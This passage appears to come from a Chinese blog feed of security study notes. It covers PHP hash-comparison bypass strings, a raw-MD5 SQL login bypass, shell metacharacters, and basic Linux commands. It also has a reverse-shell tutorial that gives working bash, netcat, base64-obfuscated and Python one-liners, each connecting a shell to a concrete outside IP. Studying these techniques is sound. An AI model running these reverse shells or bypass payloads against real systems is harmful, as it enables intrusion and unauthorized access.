class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span><br>NOOPCJF：<span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span><br>MMHUWUV：<span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span><br>MAUXXQC：<span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span><br></code></pre></td></tr></table></figure><h3 id="sha1值相等的字符串"><a href="#sha1值相等的字符串" class="headerlink" title="sha1值相等的字符串"></a>sha1值相等的字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">● array1=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>%<span class="hljs-number">7</span>FF%DC%<span class="hljs-number">93</span>%A6%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%AA%<span class="hljs-number">1</span>D%B2V%<span class="hljs-number">0</span>BE%CAg%D6%<span class="hljs-number">88</span>%C7%F8K%<span class="hljs-number">8</span>CLy%<span class="hljs-number">1</span>F%E0%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%F6%<span class="hljs-number">14</span>%F8m%B1i%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%C5kE%C1S%<span class="hljs-number">0</span>A%FE%DF%B7%<span class="hljs-number">608</span>%E9rr/%E7%ADr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EI%<span class="hljs-number">04</span>%E0F%C20W%<span class="hljs-number">0</span>F%E9%D4%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%AB%E1.%F5%BC%<span class="hljs-number">94</span>%<span class="hljs-number">2</span>B%E35B%A4%<span class="hljs-number">80</span>-%<span class="hljs-number">98</span>%B5%D7%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>A3.%C3%<span class="hljs-number">7</span>F%AC5%<span class="hljs-number">14</span>%E7M%DC%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>C%C1%A8t%CD%<span class="hljs-number">0</span>Cx0Z%<span class="hljs-number">21</span>Vda0%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%<span class="hljs-number">60</span>k%D0%BF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A8%<span class="hljs-number">04</span>F%<span class="hljs-number">29</span>%A1<br>● &amp;array2=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>sF%DC%<span class="hljs-number">91</span>f%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">11</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%B6%<span class="hljs-number">21</span>%B2V%<span class="hljs-number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="hljs-number">5</span>B%A8Ly%<span class="hljs-number">03</span>%<span class="hljs-number">0</span>C%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%E2%<span class="hljs-number">18</span>%F8m%B3%A9%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%D5%DFE%C1O%<span class="hljs-number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EE%BC%E0F%D2%<span class="hljs-number">3</span>CW%<span class="hljs-number">0</span>F%EB%<span class="hljs-number">14</span>%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%BBU.%F5%A0%A8%<span class="hljs-number">2</span>B%E31%FE%A4%<span class="hljs-number">807</span>%B8%B5%D7%<span class="hljs-number">1</span>F%<span class="hljs-number">0E3</span>.%DF%<span class="hljs-number">93</span>%AC5%<span class="hljs-number">00</span>%EBM%DC%<span class="hljs-number">0</span>D%EC%C1%A8dy%<span class="hljs-number">0</span>Cx%<span class="hljs-number">2</span>Cv%<span class="hljs-number">21</span>V%<span class="hljs-number">60</span>%DD0%<span class="hljs-number">97</span>%<span class="hljs-number">91</span>%D0k%D0%AF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A4%BCF%<span class="hljs-number">29</span>%B1<br></code></pre></td></tr></table></figure><p>使用ffifdyop万能密码绕过。ffifdyop的MD5加密结果是276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成<code>&#39;or&#39;6xxx</code>,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密。关键参数为md5(xx,true)。</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>符号</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&amp;用于在同一命令行中依次执行多个命令，不管前面的命令执行是否成功，后面的命令都会继续执行<br>&amp;&amp;同样用于依次执行多个命令，但只有当前面的命令成功执行（返回退出码为 <span class="hljs-number">0</span>）时，后面的命令才会执行<br>|是管道符，将前一个命令的输出作为后一个命令的输入<br>||用于依次执行多个命令，只有当前面的命令执行失败（返回退出码不为 <span class="hljs-number">0</span>）时，后面的命令才会执行<br>;用于分隔多个命令使其按顺序依次执行，每个命令都会独立执行，不会影响到其他命令的执行<br>?匹配一个任意字符<br>*匹配<span class="hljs-number">0</span>个或多个任意字符，也就是可以匹配任何内容<br>[]匹配括号中任意一个字符<br>[-]匹配括号中任意一个字符，“-”代表范围<br>[^]逻辑非，表示匹配不是括号内的一个字符<br><span class="hljs-string">&#x27;&#x27;</span>单引号，在单引号中所有的特殊符号，如 <span class="hljs-variable">$ </span>和 `（反引号）都无特殊含义<br><span class="hljs-string">&quot;&quot;</span>双引号，在双引号中特殊符号都无特殊含义，但 <span class="hljs-variable">$ </span>、 ` （反引号）和 \ 是例外，拥有“调用变量值”,“引用命令”和“转义符”的特殊含义<br>`反引号：反引号括起来的内容是系统命令，在<span class="hljs-title class_">Bash</span>中先会执行它和()<br><span class="hljs-variable">$(</span>)和反引号作用相同，用来引用系统命令<br><span class="hljs-comment">#在shell脚本中,# 开头的行代表注释</span><br><span class="hljs-variable">$</span>用于调用变量的值，如需要调用变量 name 的值时，需要用 <span class="hljs-variable">$name</span> 的方式得到<br>\转义符，跟在\之后的特殊字符将失去特殊含义，变为普通字符<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell</title>
    <link href="/2025/04/25/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2025/04/25/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>反弹shell（Reverse Shell）是一种常见的攻击方式，通常用于远程控制目标系统。它与传统的“反向连接”（Reverse Connection）相似，通过允许目标系统主动连接回攻击者的机器，从而绕过防火墙或NAT（网络地址转换）等网络安全措施。</p><p>反弹 shell 是一种网络攻击技术，它允许攻击者在远程目标机器上执行一个命令，使得目标机器主动向攻击者的机器发起网络连接，将一个命令行 shell（如 bash、cmd 等）提供给攻击者，从而让攻击者能够控制目标机器的 shell，就好像直接在目标机器上操作一样。</p><h2 id="什么时候想要使用反弹shell"><a href="#什么时候想要使用反弹shell" class="headerlink" title="什么时候想要使用反弹shell"></a>什么时候想要使用反弹shell</h2><p>当我们在后续操作中需要使用到提权，或者命令执行失败，执行命令没有回显的时候，我们都需要想到使用反弹shell，以便我们进行后续的操作</p><p>反弹shell的前提是要有一个VPS</p><h2 id="反弹shell工作原理"><a href="#反弹shell工作原理" class="headerlink" title="反弹shell工作原理"></a>反弹shell工作原理</h2><p>通常情况下，我们会从本地计算机发起连接去访问远程服务器，这是正向连接，比如使用 SSH、HTTP 等协议。然而，在某些情况下，目标机器可能处于防火墙或网络地址转换（NAT）之后，外部无法直接访问，或者目标机器有严格的入站连接限制，这时正向连接就无法实现。</p><p>在传统的shell远程访问中，攻击者的机器通常会主动连接到目标机器上。反弹shell与之相反，反弹shell利用反向连接的概念，在目标机器上执行一个命令，该命令会主动向攻击者控制的服务器发起连接，目标机器主动连接到攻击者的机器，并向攻击者的机器发送一个shell（命令行接口）。攻击者通过这个shell可以绕过防火墙和NAT限制，从而可以执行命令、上传、下载文件等操作，实现对目标机器的远程控制。</p><h3 id="反弹shell具体步骤"><a href="#反弹shell具体步骤" class="headerlink" title="反弹shell具体步骤"></a>反弹shell具体步骤</h3><ul><li>攻击者：首先，攻击者启动一个监听程序（如 netcat），等待目标机器的连接。</li><li>目标机器：目标机器（被攻击的系统）会主动向攻击者机器发起连接，并将一个shell连接回攻击者</li><li>一旦连接建立，攻击者就可以通过该连接来控制目标机器</li></ul><h3 id="反弹shell过程"><a href="#反弹shell过程" class="headerlink" title="反弹shell过程"></a>反弹shell过程</h3><ul><li>攻击者端：攻击者使用一个监听程序（如<code>netcat</code>）等待来自目标机器的连接。</li></ul><p>例如：攻击者在自己的机器上运行一下命令来监听一个端口（如<code>2333</code>端口）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><ul><li>目标端：目标机器发起一个连接会攻击者，连接后会得到一个shell。</li></ul><p>例如：目标机器上使用<code>netcat</code>发起反向连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">----------------------------------------<br>bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>/*<br>使用 Bash 实现反弹 shell（适用于Linux系统）<br>bash -i：打开一个交互式的 bash shell。<br>&gt;&amp;：将标准输出和标准错误输出重定向。<br>/dev/tcp/47.122.75.126/2333：利用 bash 的特殊文件表示，尝试建立一个到 47.122.75.126 的 2333 端口的TCP连接。<br>0&gt;&amp;1：将标准输入重定向到标准输出，这样可以让攻击者通过建立的TCP连接与 bash shell 进行交互。<br>*/<br>----------------------------------------<br><span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>----------------------------------------<br><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>/*<br>//base64编码绕过<br>*/<br>----------------------------------------<br>nc 47.122.75.126 2333 -e /bin/bash<br>/*<br>2333 是监听的端口，-e /bin/bash 表示通过这个连接执行 /bin/bash 命令，即启动一个 shell<br>*/<br>----------------------------------------<br>nc -e /bin/bash 47.122.75.126 2333<br>/*<br>对于一些较旧的nc版本可以使用。<br>nc（Netcat）：一个强大的网络工具，可用于各种网络操作<br>-e：指定连接成功后执行的程序，这里将 /bin/bash 作为程序，即一旦与 47.122.75.126 的 2333 端口建立连接，就会执行 /bin/bash 并将其作为shell提供给对方。<br>*/<br>----------------------------------------<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 2333 &gt;/tmp/f<br>/*<br>对于较新的 nc 版本，可能不支持 -e 选项，可以用这个命令来代替<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f：删除 /tmp/f ，并创建一个命令管道 /tmp/f<br><span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 4444 &gt;/tmp/f：使用管道将 <span class="hljs-built_in">cat</span> 从命名管道读取的数据送给 bash -i，将 bash 的标准错误输出重定向到标准输出，再通过 nc 发送给 47.122.75.126 的 4444 端口，同时 nc 接收的数据重定向回命名管道，形成一个双向通信通道。<br>*/<br>----------------------------------------<br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.122.75.126&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br>/*<br>使用 python 实现反弹shell<br>import socket,subprocess,os：导入所需的模块，socket 用于网络连接，subprocess 用于执行外部命令，os 用于文件描述符操作。<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)：创建一个 IPv4 的 TCP 套接字。<br>s.connect((&quot;<span class="hljs-number">47.122</span>.<span class="hljs-number">75.126</span>&quot;,<span class="hljs-number">2333</span>))：连接到 47.122.75.126 的 2333 端口。<br>os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)：将套接字的文件描述符复制到标准输入、标准输出和标准错误输出，实现通过套接字的输入输出功能。<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])：执行一个交互式的 bash shell。<br>*/<br>----------------------------------------<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础指令</title>
    <link href="/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/"/>
    <url>/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux基础指令"><a href="#Linux基础指令" class="headerlink" title="Linux基础指令"></a>Linux基础指令</h1><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> [选项] [目录或文件]<br></code></pre></td></tr></table></figure><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-a    列出目录下的所有文件，包括以 . 开头的隐含文件。 </li><li>-d    将目录象文件一样显示，而不是显示其下的文件。 如：ls –d 指定目录 </li><li>-i     输出文件的 i 节点的索引信息。 如 ls –ai 指定文件 </li><li>-k    以 k 字节的形式表示文件的大小。ls –alk 指定文件 </li><li>-l     列出文件的详细信息。 </li><li>-t     以时间排序。 </li><li>-R    列出所有子目录下的文件。(递归)</li></ul><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>显示用户当前所在的目录</p><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> [目录名]<br></code></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>改变工作目录。将当前工作目录改变到指定的目录下。</p><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">返回上级目录<span class="hljs-built_in">cd</span> ../<br>绝对路径 <span class="hljs-built_in">cd</span> /home/litao/linux/<br>相对路径 <span class="hljs-built_in">cd</span> ../day02/<br>进入用户家目<span class="hljs-built_in">cd</span> ~<br>返回最近访问目录   <span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> [ 选项 ]... 文件 ...<br></code></pre></td></tr></table></figure><h3 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h3><p>touch 命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在 的文件。</p><h3 id="常用选项-1"><a href="#常用选项-1" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-a 或–time&#x3D;atime或–time&#x3D;access或–time&#x3D;use只更改存取时间。</li><li>-d 使用指定的日期时间，而非现在的时间。</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间。</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同。</li><li>-t 使用指定的日期时间，而非现在的时间。</li></ul><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><p>创建一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> study.txt<br></code></pre></td></tr></table></figure><p>批量创建文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">touch &#123;a,b,c&#125;<span class="hljs-string">.txt</span><br>touch &#123;0.<span class="hljs-string">.9</span>&#125;<span class="hljs-string">.txt</span><br></code></pre></td></tr></table></figure><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> [ 选项 ] 源文件或目录 目标文件或目录<br></code></pre></td></tr></table></figure><h3 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h3><p>复制文件或目录</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>cp 指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存 在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后 的目的地并非一个已存在的目录，则会出现错误信息</p><h3 id="常用选项-2"><a href="#常用选项-2" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f 或 –force 强行复制文件或目录， 不论目的文件或目录是否已经存在</li><li>-i 或 –interactive 覆盖文件之前先询问用户</li><li>-r 递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的形态，不属于目录或符号 链接， 则一律视为普通文件处理</li><li>-R 或 –recursive 递归处理，将指定目录下的文件及子目录一并处理</li></ul><h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><p>复制文件只需要将源文件和目标文件名称一起键入即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> text1.txt new_file.txt<br></code></pre></td></tr></table></figure><p>还可以使用递归标志复制整个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -r test1/ test2/<br></code></pre></td></tr></table></figure><h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常 用的命令， 经常用来备份文件或者目录。</p><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> [选项] 源文件或目录 目标文件或目录<br></code></pre></td></tr></table></figure><h3 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h3><ol><li>视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移 至一个新的 目录中。</li><li>当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录 名），它将 所给的源文件或目录重命名为给定的目标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文 件均移至目 标目录中。</li></ol><h3 id="常用选项-3"><a href="#常用选项-3" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</li><li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li></ul><h3 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h3><p>如果想要移动文件到另一个文件夹，需要输入对应文件夹的完整路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> filename.txt /home/grill<br></code></pre></td></tr></table></figure><p>比如准备重命名文件，同时保留在同一目录中可以输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> old_file.txt new_named_file.txt<br></code></pre></td></tr></table></figure><h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> [选项] <span class="hljs-built_in">dirname</span>... <br></code></pre></td></tr></table></figure><h3 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h3><p>在当前目录下创建一个名为 “dirname” 的目录</p><h3 id="常用选项-4"><a href="#常用选项-4" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-p、–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在,加上此选项后,系统将自动建立好 那些尚不存在的目录,即一次可以建立多个目录</li></ul><h3 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> images/创建一个保存所以图像的目录<br><span class="hljs-built_in">mkdir</span> -p test1/test2 递归建立多个目录<br></code></pre></td></tr></table></figure><h2 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h2><p>rmdir 是一个与 mkdir 相对应的命令。 mkdir 是建立目录，而 rmdir 是删除命令。</p><h3 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> [-p] [dirName]<br></code></pre></td></tr></table></figure><h3 id="适用对象"><a href="#适用对象" class="headerlink" title="适用对象"></a>适用对象</h3><p>具有当前目录操作权限的所有使用者</p><h3 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h3><p>删除空目录</p><h3 id="常用选项-5"><a href="#常用选项-5" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>p 当子目录被删除后如果父目录也变成空目录的话，就连带父目录一起删除。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> test1<br></code></pre></td></tr></table></figure><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>rm 